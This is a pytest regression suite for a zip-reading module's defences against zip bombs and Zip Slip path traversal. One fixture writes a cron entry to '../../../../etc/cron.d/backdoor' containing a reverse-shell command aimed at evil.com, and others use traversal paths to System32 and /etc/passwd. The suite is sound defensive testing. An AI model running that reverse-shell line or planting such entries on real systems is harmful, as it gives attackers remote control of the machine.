"""
Tests for safe_zip.py — ZipBomb and Zip Slip (path traversal) protection.
M-4 regression: Zip Slip detection was added but had NO tests.
"""
import io
import zipfile
import pytest
from veritensor.core.safe_zip import SafeZipReader, ZipBombError


def _make_zip(entries: dict, compression=zipfile.ZIP_STORED) -> io.BytesIO:
    """Helper: creates an in-memory ZIP from {filename: bytes_content}."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", compression=compression) as z:
        for name, content in entries.items():
            z.writestr(name, content)
    buf.seek(0)
    return buf


# ── Happy path ────────────────────────────────────────────────────────────────

def test_valid_zip_passes_validation():
    buf = _make_zip({"model.pt": b"fake weights", "config.json": b'{"lr": 0.001}'})
    with zipfile.ZipFile(buf) as z:
        SafeZipReader.validate(z)  # Must not raise


def test_empty_zip_passes_validation():
    buf = _make_zip({})
    with zipfile.ZipFile(buf) as z:
        SafeZipReader.validate(z)


# ── M-4 REGRESSION: Zip Slip (path traversal) ────────────────────────────────

def test_m4_regression_path_traversal_raises_zip_bomb_error():
    """
    M-4 regression: ZIP entries with path traversal sequences
    (../../../../etc/cron.d/backdoor) must raise ZipBombError.
    Before M-4 fix, validate() had no path traversal check.
    """
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        info = zipfile.ZipInfo("../../../../etc/cron.d/backdoor")
        z.writestr(info, b"* * * * * root /bin/bash -i >& /dev/tcp/evil.com/4444 0>&1")
    buf.seek(0)

    with zipfile.ZipFile(buf) as z:
        with pytest.raises(ZipBombError, match="Path traversal"):
            SafeZipReader.validate(z)


def test_m4_regression_windows_style_traversal():
    """Windows-style ..\\ traversal sequences must also be caught."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        info = zipfile.ZipInfo("..\\..\\Windows\\System32\\evil.dll")
        z.writestr(info, b"MZ fake DLL")
    buf.seek(0)

    with zipfile.ZipFile(buf) as z:
        with pytest.raises(ZipBombError, match="Path traversal"):
            SafeZipReader.validate(z)


def test_m4_regression_absolute_path_traversal():
    """Absolute-path entries (/etc/passwd) must be blocked."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        info = zipfile.ZipInfo("/etc/passwd")
        z.writestr(info, b"root:x:0:0:root:/root:/bin/bash")
    buf.seek(0)

    with zipfile.ZipFile(buf) as z:
        with pytest.raises(ZipBombError, match="Path traversal"):
            SafeZipReader.validate(z)


def test_legitimate_subdir_does_not_raise():
    """Deep but safe paths must pass (no traversal)."""
    buf = _make_zip({
        "models/bert/config.json": b"{}",
        "models/bert/weights.bin": b"fake",
    })
    with zipfile.ZipFile(buf) as z:
        SafeZipReader.validate(z)  # Must not raise


# ── Zip Bomb: compression ratio ───────────────────────────────────────────────

def test_zip_bomb_high_ratio_rejected():
    """
    A file with extreme compression ratio (all-zero data) must be rejected.
    Ratio = uncompressed / compressed; threshold is MAX_RATIO = 20.
    """
    # 15 MB of zeros compresses to ~15 KB → ratio ≈ 1000x → rejected
    huge_zeros = b"\x00" * (15 * 1024 * 1024)
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", compression=zipfile.ZIP_DEFLATED) as z:
        z.writestr("bomb.bin", huge_zeros)
    buf.seek(0)

    with zipfile.ZipFile(buf) as z:
        with pytest.raises(ZipBombError, match="Zip Bomb"):
            SafeZipReader.validate(z)


def test_small_file_does_not_trigger_ratio_check():
    """
    Files below MIN_SIZE_FOR_RATIO (10 MB) skip ratio check
    even if technically compressible at high ratio.
    """
    # 1 KB of zeros — below the ratio-check threshold
    small_zeros = b"\x00" * 1024
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", compression=zipfile.ZIP_DEFLATED) as z:
        z.writestr("small.bin", small_zeros)
    buf.seek(0)

    with zipfile.ZipFile(buf) as z:
        SafeZipReader.validate(z)  # Must not raise


# ── Zip Bomb: total size ──────────────────────────────────────────────────────

def test_read_method_respects_file_size_limit():
    """SafeZipReader.read() must refuse entries exceeding MAX_UNZIPPED_SIZE."""
    buf = _make_zip({"legit.txt": b"hello"})
    with zipfile.ZipFile(buf) as z:
        reader = SafeZipReader()
        # Normal read works
        data = reader.read(z, "legit.txt")
        assert data == b"hello"
